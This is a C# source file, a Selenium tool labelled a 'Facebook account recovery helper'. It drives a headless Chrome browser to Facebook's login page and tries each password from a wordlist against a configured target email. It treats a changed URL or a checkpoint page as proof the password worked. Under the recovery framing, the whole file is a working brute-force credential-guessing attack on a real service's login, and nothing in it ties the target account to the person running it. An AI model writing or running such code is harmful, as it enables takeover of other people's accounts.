using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;

namespace FacebookAccountRecoveryHelper
{
    /// <summary>
    /// Result of a recovery attempt.
    /// </summary>
    public class RecoveryResult
    {
        public bool Success { get; set; }
        public string FoundPassword { get; set; }
        public int AttemptsMade { get; set; }
    }

    /// <summary>
    /// Engine that automates Facebook's account recovery process using brute-force password attempts.
    /// </summary>
    public class RecoveryEngine
    {
        private readonly Config _config;
        private IWebDriver _driver;

        /// <summary>
        /// Initializes a new instance of the RecoveryEngine.
        /// </summary>
        /// <param name="config">Configuration settings.</param>
        public RecoveryEngine(Config config)
        {
            _config = config;
        }

        /// <summary>
        /// Runs the recovery process asynchronously.
        /// </summary>
        /// <returns>RecoveryResult indicating success or failure.</returns>
        public async Task<RecoveryResult> RunAsync()
        {
            var result = new RecoveryResult { Success = false, AttemptsMade = 0 };

            // Load wordlist
            var passwords = await LoadWordlistAsync(_config.WordlistPath);
            if (passwords == null || passwords.Count == 0)
            {
                Console.WriteLine("Wordlist is empty or could not be loaded.");
                return result;
            }

            Console.WriteLine($"Loaded {passwords.Count} passwords from wordlist.");

            // Initialize WebDriver
            try
            {
                var options = new ChromeOptions();
                if (_config.Headless)
                    options.AddArgument("--headless");
                options.AddArgument("--disable-gpu");
                options.AddArgument("--no-sandbox");
                _driver = new ChromeDriver(_config.ChromeDriverPath, options);
                Console.WriteLine("ChromeDriver initialized.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to initialize ChromeDriver: {ex.Message}");
                return result;
            }

            // Navigate to Facebook login
            try
            {
                _driver.Navigate().GoToUrl("https://www.facebook.com/login/");
                Console.WriteLine("Navigated to Facebook login page.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to navigate to Facebook: {ex.Message}");
                _driver.Quit();
                return result;
            }

            // Attempt each password
            foreach (var password in passwords)
            {
                if (result.AttemptsMade >= _config.MaxAttempts)
                {
                    Console.WriteLine("Maximum attempts reached.");
                    break;
                }

                try
                {
                    // Clear and re-enter email (sometimes page resets)
                    var emailField = _driver.FindElement(By.Id("email"));
                    emailField.Clear();
                    emailField.SendKeys(_config.TargetEmail);

                    // Enter password
                    var passField = _driver.FindElement(By.Id("pass"));
                    passField.Clear();
                    passField.SendKeys(password);

                    // Submit login form
                    passField.Submit();

                    // Wait a bit for response
                    await Task.Delay(_config.DelayMs);

                    // Check for success: if URL changed to facebook.com (logged in) or no error message
                    var currentUrl = _driver.Url.ToLower();
                    if (currentUrl.Contains("facebook.com/?") || currentUrl.Contains("facebook.com/checkpoint/"))
                    {
                        // Successful login or recovery checkpoint
                        result.Success = true;
                        result.FoundPassword = password;
                        result.AttemptsMade++;
                        Console.WriteLine($"Attempt {result.AttemptsMade}: Password '{password}' appears successful.");
                        break;
                    }
                    else
                    {
                        result.AttemptsMade++;
                        Console.WriteLine($"Attempt {result.AttemptsMade}: Password '{password}' failed.");
                    }

                    // Check for rate limiting or captcha (simple heuristic)
                    if (_driver.PageSource.Contains("too many attempts") || _driver.PageSource.Contains("captcha"))
                    {
                        Console.WriteLine("Rate limiting or captcha detected. Stopping.");
                        break;
                    }
                }
                catch (NoSuchElementException)
                {
                    Console.WriteLine("Login form elements not found. Page may have changed. Stopping.");
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error during attempt: {ex.Message}");
                    // Continue with next password
                }
            }

            // Cleanup
            _driver.Quit();
            Console.WriteLine($"Completed. Total attempts: {result.AttemptsMade}");
            return result;
        }

        /// <summary>
        /// Loads passwords from a wordlist file asynchronously.
        /// </summary>
        /// <param name="path">Path to the wordlist file.</param>
        /// <returns>List of password strings.</returns>
        private async Task<List<string>> LoadWordlistAsync(string path)
        {
            var passwords = new List<string>();
            try
            {
                using (var reader = new StreamReader(path))
                {
                    string line;
                    while ((line = await reader.ReadLineAsync()) != null)
                    {
                        if (!string.IsNullOrWhiteSpace(line))
                            passwords.Add(line.Trim());
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading wordlist: {ex.Message}");
                return null;
            }
            return passwords;
        }
    }
}
